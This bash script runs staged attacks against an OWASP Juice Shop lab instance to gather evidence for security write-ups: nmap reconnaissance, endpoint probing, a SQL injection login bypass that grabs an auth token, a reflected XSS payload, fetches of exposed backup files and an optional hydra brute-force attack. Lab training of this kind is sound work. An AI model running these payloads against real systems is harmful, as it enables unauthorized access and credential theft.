#!/usr/bin/env bash
#
# attack.sh — run a sequence of attacks against the lab's Juice Shop, from Kali.
#
#   AUTHORIZED USE ONLY: your own lab / TryHackMe / HTB / PortSwigger.
#   Default target is the isolated lab (see repo scope). Never point this at a
#   system you don't own or lack written authorization to test.
#
# Usage:
#   TARGET=http://192.168.0.200:8081 ./attack.sh           # all non-noisy phases
#   TARGET=http://192.168.0.200:8081 ./attack.sh --brute    # also run brute force
#
# Each phase prints what to screenshot for the writeups (see EVIDENCE.md).

set -uo pipefail

TARGET="${TARGET:-http://192.168.0.200:8081}"
HOST="$(printf '%s' "$TARGET" | sed -E 's#https?://##; s#[:/].*##')"
PORT="$(printf '%s' "$TARGET" | sed -E 's#.*:([0-9]+).*#\1#; t; s#.*#80#')"
RUN_BRUTE=0; [ "${1:-}" = "--brute" ] && RUN_BRUTE=1

have() { command -v "$1" >/dev/null 2>&1; }
hr()   { printf '\n\033[1;36m== %s ==\033[0m\n' "$1"; }
note() { printf '   \033[33m→ %s\033[0m\n' "$1"; }

printf '\033[1mTarget:\033[0m %s   (host=%s port=%s)\n' "$TARGET" "$HOST" "$PORT"
curl -fsS -o /dev/null --max-time 5 "$TARGET" \
  && echo "reachable ✓" \
  || { echo "NOT reachable — check Parallels network / Mac firewall / TARGET"; exit 1; }

# 1) RECON ---------------------------------------------------------------------
hr "1. Recon — service & version (nmap)"
if have nmap; then
  nmap -sV -p "$PORT" --script http-headers,http-title "$HOST"
  note "screenshot: open port + 'OWASP Juice Shop' title -> writeups/assets/01-nmap-output.png"
else note "nmap not found (apt install nmap)"; fi

# 2) CONTENT DISCOVERY ---------------------------------------------------------
hr "2. Content discovery — hidden endpoints"
for p in robots.txt ftp/ rest/products/search api/Challenges/ metrics ; do
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/$p")
  printf '   %-24s HTTP %s\n' "/$p" "$code"
done
note "the /ftp directory + /rest API surface are the interesting leads"

# 3) SQL INJECTION — auth bypass (A03) -----------------------------------------
hr "3. SQL injection — login bypass (A03 Injection)"
resp=$(curl -s --max-time 8 -X POST "$TARGET/rest/user/login" \
  -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}')
if printf '%s' "$resp" | grep -q '"token"'; then
  echo "   VULNERABLE ✓ — auth bypassed, got an auth token:"
  printf '%s' "$resp" | sed -E 's/.*"token":"([^"]{0,40}).*/   token=\1.../'
  note "screenshot the returned token -> writeups/assets/02-sqli-admin-token.png"
else
  echo "   no token returned (payload may need tuning, or it's patched)"
fi

# 4) CROSS-SITE SCRIPTING — reflection check (A03) -----------------------------
hr "4. XSS — reflected payload check"
xss='<iframe src="javascript:alert(1)">'
out=$(curl -s --max-time 8 -G "$TARGET/rest/products/search" --data-urlencode "q=$xss")
if printf '%s' "$out" | grep -qiF 'iframe'; then
  echo "   payload reflected unescaped in the response ✓ (DOM XSS sink)"
else
  echo "   payload not obviously reflected (try the search box in a browser/Burp)"
fi
note "confirm in browser: search the payload, watch it execute -> assets/03-xss.png"

# 5) BROKEN ACCESS CONTROL / sensitive files (A01) -----------------------------
hr "5. Broken access control — sensitive files via /ftp"
for f in package.json.bak coupons_2013.md.bak www-data ; do
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/ftp/$f")
  printf '   /ftp/%-22s HTTP %s\n' "$f" "$code"
done
note "downloadable backup/source files = information disclosure -> assets/04-ftp.png"

# 6) BRUTE FORCE (opt-in, noisy) -----------------------------------------------
hr "6. Brute force — credential attack (A07)  [opt-in: --brute]"
if [ "$RUN_BRUTE" -eq 1 ]; then
  if have hydra; then
    note "running a SMALL hydra run against the login (demo only)"
    hydra -l admin@juice-sh.op -P <(printf 'admin123\npassword\nadmin\n') \
      "$HOST" -s "$PORT" http-post-form \
      "/rest/user/login:{\"email\"\\:\"^USER^\"\\,\"password\"\\:\"^PASS^\"}:Invalid email or password" \
      -f 2>&1 | tail -8 || true
  else note "hydra not found (apt install hydra)"; fi
else
  note "skipped — pass --brute to run. Rate-limit defenses make this slow by design."
fi

hr "Done"
echo "Capture the evidence into writeups/assets/ — see EVIDENCE.md."
echo "Then watch the SAME traffic on the Mac:  make hubble-ui   (Cilium L7 flows)"
